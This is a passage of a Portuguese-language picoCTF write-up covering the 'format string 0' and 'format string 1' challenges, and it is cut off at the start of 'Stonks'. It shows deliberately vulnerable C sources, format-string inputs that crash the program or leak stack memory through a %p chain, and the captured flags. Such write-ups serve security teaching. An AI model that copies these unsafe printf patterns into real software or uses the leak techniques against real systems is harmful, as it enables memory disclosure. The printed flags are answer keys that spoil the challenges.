</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define BUFSIZE 32
</span></span></span><span class=line><span class=cl><span class=cp>#define FLAGSIZE 64
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>flag</span><span class=p>[</span><span class=n>FLAGSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>sigsegv_handler</span><span class=p>(</span><span class=kt>int</span> <span class=n>sig</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>on_menu</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>burger</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>menu</span><span class=p>[],</span> <span class=kt>int</span> <span class=n>count</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>count</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>burger</span><span class=p>,</span> <span class=n>menu</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>serve_patrick</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>serve_bob</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span><span class=n>f</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>f</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s %s&#34;</span><span class=p>,</span> <span class=s>&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=s>&#34;own debugging flag.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span> <span class=n>FLAGSIZE</span><span class=p>,</span> <span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>signal</span><span class=p>(</span><span class=n>SIGSEGV</span><span class=p>,</span> <span class=n>sigsegv_handler</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>gid_t</span> <span class=n>gid</span> <span class=o>=</span> <span class=nf>getegid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>setresgid</span><span class=p>(</span><span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>serve_patrick</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>serve_patrick</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s %s</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>%s %s</span><span class=se>\n</span><span class=s>%s&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Welcome to our newly-opened burger place Pico &#39;n Patty!&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Can you help the picky customers find their favorite burger?&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Here comes the first customer Patrick who wants a giant bite.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Please choose from the following burgers:&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Enter your recommendation: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>choice1</span><span class=p>[</span><span class=n>BUFSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>choice1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>menu1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;Breakf@st_Burger&#34;</span><span class=p>,</span> <span class=s>&#34;Gr%114d_Cheese&#34;</span><span class=p>,</span> <span class=s>&#34;Bac0n_D3luxe&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>on_menu</span><span class=p>(</span><span class=n>choice1</span><span class=p>,</span> <span class=n>menu1</span><span class=p>,</span> <span class=mi>3</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=s>&#34;There is no such burger yet!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>count</span> <span class=o>=</span> <span class=nf>printf</span><span class=p>(</span><span class=n>choice1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>count</span> <span class=o>&gt;</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>BUFSIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>serve_bob</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;Patrick is still hungry!&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;Try to serve him something of larger size!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>serve_bob</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>%s %s</span><span class=se>\n</span><span class=s>%s %s</span><span class=se>\n</span><span class=s>%s %s</span><span class=se>\n</span><span class=s>%s&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Good job! Patrick is happy!&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Now can you serve the second customer?&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Sponge Bob wants something outrageous that would break the shop&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;(better be served quick before the shop owner kicks you out!)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Please choose from the following burgers:&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Enter your recommendation: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>choice2</span><span class=p>[</span><span class=n>BUFSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>choice2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>menu2</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;Pe%to_Portobello&#34;</span><span class=p>,</span> <span class=s>&#34;$outhwest_Burger&#34;</span><span class=p>,</span> <span class=s>&#34;Cla%sic_Che%s%steak&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>on_menu</span><span class=p>(</span><span class=n>choice2</span><span class=p>,</span> <span class=n>menu2</span><span class=p>,</span> <span class=mi>3</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=s>&#34;There is no such burger yet!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=n>choice2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table></div></div><p>Para acionar a impressão da flag, você precisa explorar uma vulnerabilidade de format string. Aqui está o processo:</p><p>Ao iniciar o programa, você entra na função <code>serve_patrick()</code>. Para continuar para a função <code>serve_bob()</code>, a opção disponível é <code>Gr%114d_Cheese</code>.</p><p>Quando você chega em <code>serve_bob()</code>, há um menu semelhante, e qualquer seleção será impressa usando <code>printf</code>. Isso cria uma vulnerabilidade de <strong>format string</strong>. Escolher a opção <code>Pe%to_Portobello</code> resulta em:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Enter your recommendation: Pe%to_Portobello
</span></span><span class=line><span class=cl>Pe20021560_Portobello
</span></span></code></pre></td></tr></table></div></div><p>Isso indica que a entrada está sendo usada como formato pelo printf, e números são lidos da memória.</p><p>E se escolhermos a opção <code>Cla%sic_Che%s%steak</code>?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
</span></span><span class=line><span class=cl>Enter your recommendation: Cla%sic_Che%s%steak
</span></span><span class=line><span class=cl>ClaCla%sic_Che%s%steakic_Che(null)
</span></span><span class=line><span class=cl>picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
</span></span></code></pre></td></tr></table></div></div><p>O que aconteceu foi que o <code>%s</code> na entrada tenta imprimir strings armazenadas em endereços de memória. Como <code>printf</code> não tem argumentos para <code>%s</code>, ele usa argumentos da memória, levando a um erro de segmentação (segfault) e revelando a flag.</p><p>flag: <code>picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}</code></p><h2 id=format-string-1>format string 1<a hidden class=anchor aria-hidden=true href=#format-string-1>#</a></h2><p>Source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>secret1</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>flag</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>secret2</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Read in first secret menu item
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>FILE</span> <span class=o>*</span><span class=n>fd</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;secret-menu-item-1.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&#39;secret-menu-item-1.txt&#39; file not found, aborting.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>secret1</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Read in the flag
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>fd</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&#39;flag.txt&#39; file not found, aborting.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Read in second secret menu item
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>fd</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;secret-menu-item-2.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&#39;secret-menu-item-2.txt&#39; file not found, aborting.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>secret2</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Give me your order and I&#39;ll read it back to you:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%1024s&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Here&#39;s your order: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Bye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table></div></div><p>Temos uma vulnerabilidade de format string aqui:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%1024s&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Here&#39;s your order: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Controlamos o que é fornecido para a função <code>printf</code>. Como não sabemos o tamanho de <code>secret-menu-item-1.txt</code> ou <code>secret-menu-item-2.txt</code>, pode ficar meio difícil saber em qual lugar da memória a string em <code>flag.txt</code>está. Então eu decidi simplesmente colocar um monte de <code>%p</code>e ver o que eu consigo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Give me your order and I&#39;ll read it back to you:
</span></span><span class=line><span class=cl>%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
</span></span><span class=line><span class=cl>Here&#39;s your order: 0x402118,(nil),0x760c1fa2da00,(nil),0x11a1880,0xa347834,0x7ffcaa973f50,0x760c1f81ee60,0x760c1fa434d0,0x1,0x7ffcaa974020,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x30355f673431665f,0x7d343663363933,0x7,0x760c1fa458d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x760c1fa56de9,0x760c1f827098,0x760c1fa434d0,(nil),0x7ffcaa974030,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,
</span></span></code></pre></td></tr></table></div></div><p>A partir do pointer 14, temos uma string. Podemos ver o que ela é fazendo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>int</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mh>0x7b4654436f636970</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;little&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;picoCTF{&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Se fizermos o mesmo com os próximos valores, conseguimos a flag.</p><p>flag: <code>picoCTF{4n1m41_57y13_4x4_f14g_50396c64}</code></p><h2 id=stonks>Stonks<a hidden class=anchor aria-hidden=true href=#stonks>#</a></h2><p>Source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
